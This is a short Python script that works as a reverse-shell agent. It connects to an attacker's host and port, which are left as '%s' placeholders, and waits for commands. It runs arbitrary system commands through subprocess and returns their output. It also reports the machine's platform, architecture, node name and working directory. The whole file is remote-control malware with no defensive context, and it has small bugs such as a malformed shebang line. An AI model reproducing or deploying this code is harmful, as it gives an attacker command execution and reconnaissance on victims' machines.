#/usr/bin/python
import os,sys,socket,platform,subprocess
def connect():
    connector = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connector.connect(("%s",%s))
    while True:
        data = connector.recv(1024)
        response = run(data)
        connector.send(response)
def run(option):
    #core
    if(option == "disconnect"):
        sys.exit()
    #get option
    elif(option[:3] == "get"):
        return get(option[4:])
    #system commands
    elif(option[:6] == "system"):
        return run_system_command(option[7:])
    else:
        return "[~] Invalid argument supplied!"
def run_system_command(command):
    try:
        return subprocess.check_output(command)
    except OSError or subprocess.CalledProcessError:
        return("[~] Invalid command!")
def info_parser():
    _platform = "Platform: " + platform.platform()            #0
    _arch     = "Architecture: " + platform.architecture()[0] #1
    _node     = "Node: " + platform.node()                    #2
    _pyvers   = "Python version: " + platform.python_version()#3
    _processor = "processor: " + platform.processor()         #4
    infos = ">>\n" + _platform + "\n" + _arch + "\n" + _node + "\n" + _pyvers + "\n" + _processor + "\n>>\n"
    return infos
def get(option):
    if(option == "infos"):
        return info_parser()
    elif(option == "dir"):
        return subprocess.check_output("pwd")
    else:
        return "[~] Invalid argument supplied!"
connect()
